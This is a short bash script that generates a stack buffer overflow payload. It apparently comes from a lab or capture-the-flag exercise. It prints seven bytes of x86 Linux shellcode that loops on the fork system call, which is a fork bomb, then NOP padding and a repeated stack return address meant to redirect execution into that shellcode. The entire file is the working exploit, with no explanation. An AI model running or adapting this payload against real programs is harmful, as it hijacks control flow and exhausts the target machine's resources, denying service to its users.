#!/bin/bash

#7 bytes
echo -ne "\x6a\x02\x58\xcd\x80\xeb\xf9"

for i in $(seq 8 23)
do
	echo -ne "\x90"
done

for i in 1 2
do
	echo -ne "\x41\xce\xff\xff"
done
